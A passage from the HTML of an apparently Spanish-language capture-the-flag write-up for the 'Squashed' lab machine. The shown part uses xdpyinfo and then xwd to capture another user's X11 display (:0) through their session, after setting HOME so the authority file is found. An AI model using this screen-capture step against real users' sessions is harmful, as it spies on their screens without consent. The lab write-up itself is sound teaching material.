+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xdpyinfo -display :0
+</span></span><span class="line"><span class="cl">name of display:    :0
+</span></span><span class="line"><span class="cl">version number:    11.0
+</span></span><span class="line"><span class="cl">vendor string:    The X.Org Foundation
+</span></span><span class="line"><span class="cl">vendor release number:    12013000
+</span></span><span class="line"><span class="cl">X.Org version: 1.20.13
+</span></span><span class="line"><span class="cl">maximum request size:  16777212 bytes
+</span></span><span class="line"><span class="cl">motion buffer size:  256
+</span></span><span class="line"><span class="cl">bitmap unit, bit order, padding:    32, LSBFirst, 32
+</span></span><span class="line"><span class="cl">image byte order:    LSBFirst
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>No olvidemos que hay que darle valor a la variable HOME porque si no no sabrá donde está el fichero.</p>
+<p>Hacemos una captura:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> xwd -root -screen -silent -display :0 &gt; file.xwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos la pasamos a nuestro equipo y:</p>
+<p><img src="/p/1/squashed-machine/squashed6.png"
+	width="835"
+	height="651"
+	srcset="/p/1/squashed-machine/squashed6_hu99a291ca791f4df63df6de1fe0206807_44266_480x0_resize_box_3.png 480w, /p/1/squashed-machine/squashed6_hu99a291ca791f4df63df6de1fe0206807_44266_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="128"
+		data-flex-basis="307px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/rpc/">rpc</a>
+        
+            <a href="/tags/nfs/">nfs</a>
+        
+            <a href="/tags/x11/">X11</a>
+        
+            <a href="/tags/rce/">rce</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/1/soccer-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/1/soccer-machine/landing.55ef91476fa5ae5d0e802d2cb0908ec2.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Soccer Machine"
+                        
+                        data-hash="md5-Ve&#43;RR2&#43;lrl0OgC0ssJCOwg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Soccer Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/1/metatwo-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/1/metatwo-machine/landing.4ab57de3831f316fac9172831f1faf3b.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post MetaTwo Machine"
+                        
+                        data-hash="md5-SrV944MfMW&#43;skXKDHx&#43;vOw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MetaTwo Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/1/precious-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/1/precious-machine/landing.be74656f9a7d9749d196b350c0a32506.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Precious Machine"
+                        
+                        data-hash="md5-vnRlb5p9l0nRlrNQwKMlBg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Precious Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/1/stocker-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/1/stocker-machine/landing.68db51351a961a770e3391348a38dab9.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Stocker Machine"
+                        
+                        data-hash="md5-aNtRNRqWGncOM5E0ijjauQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Stocker Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 4rtic f0x
+    </section>
+    
+    <section class="powerby">
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
